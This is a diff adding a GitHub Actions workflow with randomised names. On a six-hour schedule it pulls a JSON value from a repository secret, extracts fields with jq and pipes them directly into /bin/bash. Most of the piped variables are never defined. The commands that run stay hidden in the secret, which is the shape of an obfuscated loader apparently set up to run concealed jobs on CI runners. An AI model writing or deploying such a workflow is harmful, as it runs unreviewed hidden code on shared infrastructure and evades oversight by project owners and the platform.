@@ -1,0 +1,26 @@
+name: shizuniao3289
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shizuniao3289
+        env:
+          b7742: ${{ secrets.b7742 }}
+        run: |
+          echo $b7742 | jq -r .tjyd1970 | /bin/bash
+          echo $qnmx1735 | jq -r .ncv44939 | /bin/bash
+          echo $ikk3 | jq -r .p07568 | /bin/bash
+          echo $a8 | jq -r .ib3 | /bin/bash
+          echo $os41144 | jq -r .krxz49556 | /bin/bash
+          echo $drhd06 | jq -r .to29 | /bin/bash
+          echo $qhmuz87 | jq -r .b463 | /bin/bash
+          echo $ula2 | jq -r .o4269 | /bin/bash
+          echo $rbokf288 | jq -r .hpgvn9974 | /bin/bash
+
